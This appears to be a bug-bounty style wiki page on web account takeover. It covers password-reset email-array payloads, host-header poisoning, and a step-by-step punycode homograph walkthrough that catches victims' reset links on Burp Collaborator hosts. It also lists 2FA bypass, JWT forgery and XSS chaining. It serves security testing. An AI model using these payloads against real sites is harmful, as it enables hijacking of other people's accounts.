---
tags:
  - Web
---

# :material-account-convert: Account Takeover

<span class="pill pill-hard">high impact</span> <span class="pill pill-info">web</span>

**Account takeover (ATO)** is the end goal a lot of web bugs fold into: get authenticated as someone else. It's rarely one exotic vuln — usually a flaw in password reset, email change, OAuth, or session handling that you chain.

!!! abstract "TL;DR"
    Hunt the account-recovery and identity-change flows. Any place the app trusts client-supplied identity data (email arrays, host headers, unverified tokens) is a candidate for redirecting a reset or binding your credentials to a victim's account.

## :material-email-alert: Password-reset abuse

!!! loot "Reset link delivered to attacker + victim (email array)"
    Some reset endpoints accept a **list** of emails from the client and mail the reset link to all of them without verifying ownership. Send both the victim's and your address:

    ```http
    POST /change-password
    Content-Type: application/json
    ```
    ```json
    {
      "user": {
        "email": [
          "victim@example.com",
          "attacker@example.com"
        ]
      }
    }
    ```
    The reset link lands in **your** inbox too → take over the account. Also try `email=victim@x.com&email=attacker@x.com` (parameter pollution) and a CC/BCC-style second field.

Other reset weaknesses to test:

- **Host-header poisoning** — the reset link is built from the `Host`/`X-Forwarded-Host` header. Set it to your domain and the victim's click leaks the token to you.
- **Token weakness** — predictable/sequential tokens, no expiry, token not bound to the user, or the token leaking in the `Referer` when the reset page loads third-party resources.
- **Response leak** — the reset API returns the token/link in its JSON response.

## :material-translate: Punycode / IDN homograph ATO

<span class="pill pill-hard">0-click</span> <span class="pill pill-info">email normalization</span>

*From "The Most Underrated 0-Click Account Takeover Using Punycode IDN Attacks" by [coffinxp](https://medium.com/@coffinxp).*

No phishing, no link for the victim to click — just an email address that two parts of the app disagree about.

### Punycode vs IDN homograph

**Punycode** is an encoding: it represents Unicode labels using nothing but ASCII (the `xn--` prefix), so systems that only speak ASCII — DNS above all — can still carry them.

```
Unicode email:    аdmin@example.com      (Cyrillic "а", U+0430)
Punycode format:  xn--dmin-7cd@example.com
```

An **IDN homograph attack** is what you *do* with that: pick codepoints from another script that render identically to Latin ones, so the two strings are indistinguishable on screen and completely different underneath.

```
"admin@example.com" vs "аdmin@example.com" (Cyrillic "а")
```

!!! tip "Watch the double hyphen"
    Blogs and Medium exports render the ACE prefix `xn--` as `xn —`. Retype it as two plain hyphens or the address is garbage.

### Why the collision happens

The bug is a split brain over **normalization** — one code path folds the Unicode into its ASCII lookalike and another one doesn't:

- The **signup / duplicate check** normalizes. `gmàil.com` collapses to `gmail.com`, so the app answers `Email already exists` — it just matched the *victim's* row.
- The **reset / mail-delivery** path keeps the raw Unicode, so the token is sent to the attacker-controlled IDN host.

Account lookup resolves to the victim, delivery resolves to you. It works in reverse too (byte-exact comparison, normalizing sender). Any inconsistency between the signup, login and reset flows is exploitable — that is the whole bug class.

### Lab setup

- **Burp Suite** — mandatory. Chrome and friends encode Unicode in form fields before the request leaves the browser, which destroys the payload; rewrite the email field in the intercepted request instead.
- **Burp Collaborator** — stands in for an SMTP/email callback server. No real IDN domain and no mail server needed for the PoC.
- **Punycode generator** — [`punycode_gen.py`](https://github.com/coffinxp/scripts/blob/main/punycode_gen.py) from `coffinxp/scripts` prints every available punycode character with its encoded value; feed it a letter and it returns the substitute. Verify the result with the [Punycode converter](https://www.punycoder.com/).

### Walkthrough

**1. Register with a normal email.** Any signup form on `$TARGET`; use a Collaborator payload as the mail host so you can see callbacks:

```
security@gmail.com.bcrkly6yl8ke552nzjt7jtu52w8nwdk2.oastify.com
```

Log in once with those credentials to confirm the account is live, then log out.

**2. Re-signup with a punycode variant.** Swap one letter of the **domain** (`a` -> `à`) and push it through Burp, not the browser UI:

```
security@gmàil.com.bcrkly6yl8ke552nzjt7jtu52w8nwdk2.oastify.com
```

!!! bug "`Email already exists`"
    That response is the tell. The app normalized your homograph back onto the first account — two different byte strings, one identity.

**3. Trigger the reset with the punycode address.** Forgot-password form, same address, again edited in the intercepted request:

```
security@gmàil.com.bcrkly6yl8ke552nzjt7jtu52w8nwdk2.oastify.com
```

**4. Catch the reset link.** Forward the request and watch Burp Collaborator for the SMTP callback — the password-reset URL is in the message body. Open it and set a new password.

**5. Take over.** Log back in with the **original ASCII email** and the password you just set. You are in the victim's account, with zero interaction on their side.

### Punycode in the local part

Developers who sanitize the domain almost never sanitize the local-part, so this variant survives longer.

- Register with a modified username, via Burp:

  ```
  ṡecurity@gmail.com.bcrkly6yl8ke552nzjt7jtu52w8nwdk2.oastify.com
  ```

- If the server accepts and creates the account, that is the first win. Now request a password reset for the plain version:

  ```
  security@gmail.com.bcrkly6yl8ke552nzjt7jtu52w8nwdk2.oastify.com
  ```

- A reset mail landing in Collaborator proves both forms resolve to one account. Reset, then log in with the original address — same 0-click ATO through the local part.

!!! loot "2FA bypass"
    When the app folds `gmáil.com` into `gmail.com`, register `victim@gmáil.com` and enrol **your own** 2FA on it. Your code now satisfies the MFA prompt for `victim@gmail.com`.

Deeper backend/normalization breakdown: the [Voorivex team](https://voorivex.team/) write-up on puny-code inconsistencies, which also provides the lab used above.

## :material-swap-horizontal: Other ATO vectors

- **Email-change without re-auth or verification** — change the victim's email to yours (needs an [IDOR](idor.md)/CSRF to target their account), then reset.
- **[IDOR](idor.md) on identity fields** — update another user's email/phone/password by swapping an ID.
- **[OAuth / SAML](oauth-saml.md)** — account linking by email without verification, `redirect_uri` theft of the code, or pre-account-takeover (register the victim's email before they use SSO).
- **[JWT](jwt.md)** flaws — `alg:none`, weak secret, or `kid` injection to forge a token for any user.
- **Response manipulation** on 2FA/login — flip a `"verified": false` or drop the OTP step client-side.
- **Session fixation** — plant a known session, get the victim to authenticate into it.

!!! tip "Chain from [XSS](xss.md)"
    Same-origin XSS reads the CSRF token and drives an in-page email/password change — instant ATO even with `HttpOnly` cookies.

## :material-link-variant: Related

- Assembled from [IDOR](idor.md), [CSRF](csrf.md), [XSS](xss.md), [JWT](jwt.md), and [OAuth / SAML](oauth-saml.md) flaws.
- See also [Auth Bypass](auth-bypass.md).
- Reference: [PortSwigger authentication vulnerabilities](https://portswigger.net/web-security/authentication).
